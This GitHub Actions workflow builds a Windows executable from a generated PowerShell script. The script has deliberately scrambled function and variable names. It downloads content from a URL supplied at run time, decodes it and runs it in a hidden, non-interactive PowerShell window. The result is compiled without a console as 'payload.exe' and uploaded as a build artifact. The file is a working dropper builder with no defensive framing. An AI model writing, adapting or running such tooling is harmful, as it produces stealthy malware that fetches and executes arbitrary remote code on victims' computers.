name: Build PowerShell EXE using ps2exe

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch payload'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout the repository
    - name: Checkout code
      uses: actions/checkout@v3

    # Step 2: Install ps2exe module
    - name: Install ps2exe Module
      shell: powershell
      run: |
        Install-Module -Name ps2exe -Force -Scope CurrentUser

    # Step 3: Fetch and Modify the PowerShell Script
    - name: Inject URL into Static PowerShell Script
      shell: powershell
      run: |
        $payloadUrl = '${{ github.event.inputs.payload_url }}'
        $staticCode = @"
        function XhYjVwJtKz {
            param (
                [string]$AaBbCcDdEe
            )
            try {
                $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
                return $FfGgHhIiJj.Content
            }
            catch {
                return $null
            }
        }

        function XoRpQkZtLs {
            param (
                [string]$PpQqRrSsTt
            )
            try {
                $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
                powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
            }
            catch {
            }
        }

        `$QwErTyUuOo = "$payloadUrl"  # Injected URL

        `$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe `$QwErTyUuOo

        if (`$VvWwXxYyZz) {
            `$ZzYyXxWwVv = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$VvWwXxYyZz))
            XoRpQkZtLs -PpQqRrSsTt `$ZzYyXxWwVv
        }
        "@

        Set-Content -Path "staticcode.ps1" -Value $staticCode

    # Step 4: Convert PowerShell Script to EXE
    - name: Convert Static PowerShell Script to EXE
      shell: powershell
      run: |
        ps2exe -inputFile '.\staticcode.ps1' -outputFile '.\payload.exe' -noConsole

    # Step 5: Upload the generated EXE as an artifact
    - name: Upload Executable
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe







